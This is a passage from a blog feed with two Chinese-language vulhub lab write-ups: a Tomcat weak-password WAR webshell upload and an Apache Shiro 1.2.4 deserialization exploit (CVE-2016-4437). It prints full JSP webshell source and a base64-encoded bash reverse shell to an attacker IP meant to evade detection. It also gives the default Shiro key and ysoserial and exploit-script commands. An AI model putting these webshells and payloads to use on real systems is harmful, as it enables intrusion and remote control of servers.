            "content_html": "<h1 id=\"【vulhub】Tomcat漏洞复现\"><a href=\"#【vulhub】Tomcat漏洞复现\" class=\"headerlink\" title=\"【vulhub】Tomcat漏洞复现\"></a>【vulhub】Tomcat漏洞复现</h1><p>​\tTomcat是一个开源的、轻量级的应用服务器，是Apache软件基金会的一个项目。它实现了Java Servlet、JavaServer Pages（JSP）和 Java Expression Language（EL）等Java技术，用于支持在Java平台上运行的动态Web应用程序。Tomcat的全名是Apache Tomcat。</p>\n<p>​\tTomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。Tomcat大都是java代码写的，所以他依赖于java的JDK环境。</p>\n<h1 id=\"Tomcat8\"><a href=\"#Tomcat8\" class=\"headerlink\" title=\"Tomcat8\"></a>Tomcat8</h1><h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</p>\n<p>Tomcat版本：8.0</p>\n<p>环境说明</p>\n<p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p>\n<p>Tomcat7+权限分为：</p>\n<ul>\n<li>manager（后台管理）<ul>\n<li>manager-gui 拥有html页面权限</li>\n<li>manager-status 拥有查看status的权限</li>\n<li>manager-script 拥有text接口的权限，和status权限</li>\n<li>manager-jmx 拥有jmx权限，和status权限</li>\n</ul>\n</li>\n<li>host-manager（虚拟主机管理）<ul>\n<li>admin-gui 拥有html页面权限</li>\n<li>admin-script 拥有text接口权限</li>\n</ul>\n</li>\n</ul>\n<p>​\twar包是用来进行Web开发时一个网站项目下的所有代码,包括前台HTML&#x2F;CSS&#x2F;JS代码,以及后台JavaWeb的代码。 当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布则也会打包成War包进行发布。War包 可以放在Tomcat下的webapps或word目录,当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。</p>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>首先尝试利用弱口令（tomcat:tomcat）登录到后台，登入后台可以发现一个文件上传点，用于上传war包的，以此为基础，文件上传后门木马进行连接</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png\" alt=\"1\"></p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png\" alt=\"11\"></p>\n<p>需要准备好恶意代码，要免杀处理后的木马</p>\n<p>如冰蝎可以连接成功的木马（.jsp）（密码rebeyond）（蚁剑无法连接该木马，原因未了解）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>如蚁剑可以连接成功的木马（.jsp）（密码passwd）（冰蝎无法连接该木马，原因未了解）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%!</span><br><span class=\"line\">    class U extends ClassLoader &#123;</span><br><span class=\"line\">        U(ClassLoader c) &#123;</span><br><span class=\"line\">            super(c);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public Class g(byte[] b) &#123;</span><br><span class=\"line\">            return super.defineClass(b, 0, b.length);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class=\"line\">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class=\"line\">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class=\"line\">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    String cls = request.getParameter(&quot;passwd&quot;);</span><br><span class=\"line\">    if (cls != null) &#123;</span><br><span class=\"line\">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>将木马压缩为.zip文件，然后再将文件后缀更改为.war后进行上传，观察发现上传成功（这里就先上传一个简单的一句话php木马）</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png\" alt=\"2\"></p>\n<p>进入对应目录查看，可以发现刚才上传的一句话木马被处理掉了，也就无法正常进行连接，所以需要进行免杀处理。</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png\" alt=\"3\"></p>\n<p>这次上传蚁剑可以连接的木马进行同上的操作后上传，并尝试连接，发现可以连接成功。</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png\" alt=\"4\"></p>\n<p>同样，也可以上传一个冰蝎可以连接的木马，并尝试连接，发现可以连接成功。</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png\" alt=\"5\"></p>\n",
            "tags": [
                "原创",
                "靶场",
                "vulhub"
            ]
        },
        {
            "id": "https://w-sqrt7.gitee.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/",
            "url": "https://w-sqrt7.gitee.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/",
            "title": "【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）",
            "date_published": "2024-04-18T15:31:13.077Z",
            "content_html": "<h1 id=\"【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）\"><a href=\"#【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）\" class=\"headerlink\" title=\"【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）\"></a>【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</h1><p>​\tApache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>\n<p>​\tApache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>\n<h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>在反序列化时，没有对其进行过滤，所以如果传入恶意代码将会造成安全问题</p>\n<p><strong>在 1.2.4 版本前，是默认ASE秘钥，Key: kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，可以直接反序列化执行恶意代码。</strong>而在1.2.4之后，ASE秘钥就不为默认了，需要获取到Key才可以进行渗透，这个密钥也可能会被爆破出来，从而被攻击者利用构造payload。</p>\n<p><code>具体流程</code></p>\n<p>Apache Shiro默认使用CookieRememberMeManager。其是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。</p>\n<p>如果用户登录时勾选了rememberMe选项。用户的请求数据包中将会在cookie字段多出一段数据，这一段数据包含了用户的身份信息，且是经过加密的。</p>\n<p>加密的过程是：用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密（密钥key）&#x3D;&gt;base64编码&#x3D;&gt;添加到RememberMe Cookie字段。勾选记住密码之后，下次登录时，服务端会根据客户端请求包中的cookie值进行身份验证，无需登录即可访问。服务端处理cookie的流程：取出请求包中rememberMe的cookie值 &#x3D;&gt; Base64解码&#x3D;&gt;AES解密（密钥key）&#x3D;&gt;反序列化。</p>\n<p>攻击者直接就可以用这个密钥实现上述加密过程，在Cookie字段写入想要服务端执行的恶意代码，最后服务端在对cookie进行解密的时候（反序列化后）就会执行恶意代码。</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20003118.png\" alt=\"屏幕截图 2024-04-18 003118\"></p>\n<p><code>影响版本</code></p>\n<p>Apache Shiro &lt;&#x3D;1.2.4</p>\n<p><code>shiro特征</code></p>\n<p>首先需要判断登录页面是否使用了shiro框架进行身份验证、授权、密码学和会话管理。</p>\n<p>判断方法：进行登录操作时勾选上remember me（记住密码选项），抓包并观察，请求报文中是否有rememberme 字段，响应报文中是否有Set-cookie:rememberMe&#x3D;deleteMe字段。</p>\n<p>如果登录失败且勾选了remember选项，响应报文中有Set-cookie:rememberMe&#x3D;deleteMe；当登录成功，且勾选了remember选项，其响应报文如下图，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段。</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-17%20234618.png\" alt=\"屏幕截图 2024-04-17 234618\"></p>\n<h2 id=\"漏洞验证\"><a href=\"#漏洞验证\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h2><p>利用脚本或工具进行验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 shiro_exploit.py -u http://192.168.100.134:8080</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163349162.png\" alt=\"image-20240418163349162\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163332946.png\" alt=\"image-20240418163332946\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163611522.png\" alt=\"image-20240418163611522\"></p>\n<p>成功获取到AES密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，说明漏洞存在。</p>\n<p>利用dnslog或collaborator进一步验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &quot;ping -c 4 4kp8lyr2idc6mwiqvjbvs6yeh5nvbk.burpcollaborator.net&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185442068.png\" alt=\"image-20240418185442068\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>目标任务：构造cookie获取反弹shell</p>\n<p>nc开启监听，nc -lvvp 6666</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418170744863.png\" alt=\"image-20240418170744863\"></p>\n<p>构造反弹shell的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.100.131/6666 0&gt;&amp;1</span><br><span class=\"line\">命令中包含重定向 ’ &lt; ’ ’ &gt; ’ 和管道符 ’ | ’ 时，需要进行 base64 编码绕过检测。</span><br><span class=\"line\">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>利用序列化工具ysoserial.jar生成payload，并配置监听功能</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>这里相当于在攻击机上启动了一个VPS服务，监听7777端口，然后在这个服务上放了一个反弹shell的payload，并用序列化工具ysoserial指定利用链生成可执行bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.200.131&#x2F;6666 0&gt;&amp;1命令的序列化数据payload。当后面有客户端请求服务时，我们搭建的这个JRMP就会返回这段payload。</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183402795.png\" alt=\"image-20240418183402795\"></p>\n<p>如果不配置此项的话，直接连接，会出现如下情况，无法成功获取shell</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183458178.png\" alt=\"image-20240418183458178\"></p>\n<p>利用脚本构造出cooikie信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 shiro.py 192.168.100.131:7777</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418171624073.png\" alt=\"image-20240418171624073\"></p>\n<p>BP抓包（勾选remember选项），加入将生成的内容加入到cookie中并发送</p>\n<p>注意要将cookie中原有的内容删去，再添加构造的内容作为cookie发送</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20174103.png\" alt=\"屏幕截图 2024-04-18 174103\"></p>\n<p>然后回到kali发现获取到了shell</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174311802.png\" alt=\"image-20240418174311802\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174424393.png\" alt=\"image-20240418174424393\"></p>\n<p>也可以nc开启监听后，直接进行如下命令（脚本将上面的步骤整合到一起了），同样能够获取shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185029472.png\" alt=\"image-20240418185029472\"></p>\n<p>或直接工具进行漏洞利用</p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223333.png\" alt=\"屏幕截图 2024-04-18 223333\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418231659688.png\" alt=\"image-20240418231659688\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223718.png\" alt=\"屏幕截图 2024-04-18 223718\"></p>\n<p><img src=\"/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223753.png\" alt=\"屏幕截图 2024-04-18 223753\"></p>\n<p><strong>过程中遇见的问题以及解决方法</strong></p>\n<p>总体上，就是脚本运行的环境问题，环境不适配导致一系列报错</p>\n<p>首先，需要pyhton2版本，包括pip2，在kali上装pip2可以，先访问网址<a href=\"https://bootstrap.pypa.io/pip/2.7/get-pip.py%EF%BC%8C%E8%8E%B7%E5%8F%96get-pip.py%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%B0%86%E4%B8%8B%E8%BD%BD%E5%A5%BD%E7%9A%84get-pip.py%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%88%B0Kali%E4%B8%8A%E3%80%82%E5%9C%A8Kali%E7%BB%88%E7%AB%AF%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8python2%E6%89%A7%E8%A1%8Cget-pip.py%E6%96%87%E4%BB%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9Asudo\">https://bootstrap.pypa.io/pip/2.7/get-pip.py，获取get-pip.py文件内容，将下载好的get-pip.py文件传输到Kali上。在Kali终端中，使用python2执行get-pip.py文件，命令如下：sudo</a> python2 get-pip.py即可。运行脚本时报错No module named ‘Crypto’，则运行如下命令：pip2 install pycryptodome，（还有问题可以尝试卸载重装该模块，即pip uninstall与install），然后使用pyhton2运行脚本即可。</p>\n<p>然后就是java的版本过高，工具无法正常使用（需要java8版本），可以参考文章<a href=\"https://blog.csdn.net/huayimy/article/details/130273362\">https://blog.csdn.net/huayimy/article/details/130273362</a></p>\n<p><strong>知识点补充：</strong></p>\n<p>内存马</p>\n<p>普通的木马是写入一个文件去访问,恶意代码是依靠于文件的，执行后就会在内存中被释放掉，但是内存马是依赖于程序本身的动态注册,会在内存中进行一个保存,视为程序的一部分.实现脱离文件后依旧可以运行。</p>\n<p>JRMP</p>\n<p>Java远程方法协议（Java Remote Method Protocol，JRMP），适用于RMI过程中的协议，只有使用这个协议，方法调用双方才能正常进行数据交流。</p>\n<p>RMI</p>\n<p>远程方法调用(Remote Method Invocation)。远程调用服务器上对象的一种接口。能够让在某个java虚拟机上的对象像调用本地对象一样调用另一个java 虚拟机中的对象上的方法。</p>\n<p>参考文章：</p>\n<p><a href=\"https://blog.csdn.net/Bossfrank/article/details/130173880\">https://blog.csdn.net/Bossfrank/article/details/130173880</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/372862.html\">https://www.freebuf.com/articles/web/372862.html</a></p>\n<p><a href=\"https://blog.csdn.net/qq_44159028/article/details/115290013\">https://blog.csdn.net/qq_44159028/article/details/115290013</a></p>\n<p><a href=\"https://blog.csdn.net/huayimy/article/details/130273362\">https://blog.csdn.net/huayimy/article/details/130273362</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/379047.html\">https://www.freebuf.com/articles/web/379047.html</a></p>\n<p><a href=\"https://blog.csdn.net/Candyys/article/details/106038761\">https://blog.csdn.net/Candyys/article/details/106038761</a></p>\n<p><a href=\"https://ares-x.com/tools/runtime-exec\">https://ares-x.com/tools/runtime-exec</a></p>\n",
            "tags": [
                "原创",
                "靶场",
                "vulhub"
            ]
        }
    ]
}